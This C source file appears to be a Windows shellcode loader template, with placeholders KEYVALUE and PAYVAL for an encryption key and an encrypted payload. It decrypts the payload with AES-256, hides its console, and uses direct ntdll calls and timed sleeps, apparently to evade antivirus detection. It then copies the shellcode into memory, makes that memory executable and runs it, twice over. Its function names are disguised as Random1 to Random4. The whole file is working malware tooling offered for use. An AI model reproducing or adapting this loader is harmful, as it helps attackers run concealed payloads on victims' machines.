#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <string.h>
#include <tlhelp32.h>

// Define the NtAllocateVirtualMemory function pointer
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

// Define the NtFreeVirtualMemory function pointer
typedef NTSTATUS(WINAPI* PNTFREEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

typedef NTSTATUS(WINAPI* PNTPROTECTVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER)) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");

static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG)) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetTimerResolution");



static void Random4(float milliseconds) {
    static bool once = true;
    if (once) {
        ULONG actualResolution;
        ZwSetTimerResolution(1, true, &actualResolution);
        once = false;
    }

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
    NtDelayExecution(false, &interval);
}

int Random1(char * difern, unsigned int difern_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, difern, &difern_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

	char Random2[] = KEYVALUE
	unsigned char Random3[] = PAYVAL
	unsigned int Random7_len = sizeof(Random3);


int main() {
PNTPROTECTVIRTUALMEMORY NtProtectVirtualMemory =
        (PNTPROTECTVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");

    // Load the NtAllocateVirtualMemory function from ntdll.dll
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory =
        (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    FreeConsole();
    // Allocate Virtual Memory  
    void* exec = NULL;
    SIZE_T size = sizeof(Random3);
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &exec,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    Random1((char *) Random3, Random7_len, Random2, sizeof(Random2));
    
    Random4(1500);
    // Copy shellcode into allocated memory 
    RtlCopyMemory(exec, Random3, sizeof(Random3));
    Random4(1560);
    // Change the memory protection to RX (Read and Execute)
    DWORD oldProtect;
    if (VirtualProtect(exec, size, PAGE_EXECUTE_READ, &oldProtect) == 0) {
        // Handle error if needed
        return -1;
    }

    ((void(*)())exec)();

    // Execute shellcode in memory  
    ((void(*)())exec)();
    Random4(2540);
    // Free the allocated memory using NtFreeVirtualMemory
    PNTFREEVIRTUALMEMORY NtFreeVirtualMemory =
        (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");
    SIZE_T regionSize = 0;
    status = NtFreeVirtualMemory(GetCurrentProcess(), &exec, &regionSize, MEM_RELEASE);

    return 0;
}
